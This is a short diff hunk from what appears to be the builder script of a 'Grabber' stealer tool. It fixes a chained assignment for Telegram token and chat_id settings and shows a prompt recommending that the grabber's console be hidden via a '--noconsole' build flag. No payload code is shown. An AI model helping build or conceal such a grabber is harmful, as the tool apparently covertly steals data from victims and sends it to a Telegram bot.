@@ -105,7 +105,7 @@ while True:
             elif style_telegram == '2':
                 style_telegram = True;break
     else:
-        token = chat_id = style_telegram, telegram = False
+        token = chat_id = style_telegram = telegram = False
     
     hide = _input(f'{y}[>]Hide Grabber console? [{g}recommended{y}]({g}y{y}/{r}n{y})\n  {b}[1] - Hide\n  {b}[2] - No Hide\n{y}====>{g}').lower()
     hide = '--noconsole' if hide == '1' else ''
